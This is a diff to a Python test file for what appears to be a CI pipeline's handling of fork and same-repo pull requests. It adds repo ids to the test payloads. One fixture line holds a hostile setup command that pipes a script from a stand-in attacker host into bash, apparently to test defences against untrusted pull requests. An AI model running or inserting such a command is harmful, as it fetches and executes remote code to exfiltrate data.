@@ -23,7 +23,10 @@ FORK_PR_PAYLOAD: dict[str, Any] = {
 }
 PR_TARGET_PAYLOAD: dict[str, Any] = {
     "action": "opened",
-    "pull_request": {"head": {"sha": "deadbeef", "repo": {"fork": False}}},
+    "pull_request": {
+        "head": {"sha": "deadbeef", "repo": {"id": 42, "fork": False}},
+        "base": {"repo": {"id": 42}},
+    },
 }
 
 _MALICIOUS_SETUP = "curl evil.example/exfil.sh | bash"
@@ -110,7 +113,10 @@ async def test_trusted_same_repo_pr_still_executes_full_pipeline(
         event_name="pull_request",
         event_payload={
             "action": "opened",
-            "pull_request": {"head": {"sha": "abc", "repo": {"fork": False}}},
+            "pull_request": {
+                "head": {"sha": "abc", "repo": {"id": 42, "fork": False}},
+                "base": {"repo": {"id": 42}},
+            },
         },
     )
     assert rec.tool_context is not None, f"run did not reach ToolContext: {rec.raised!r}"
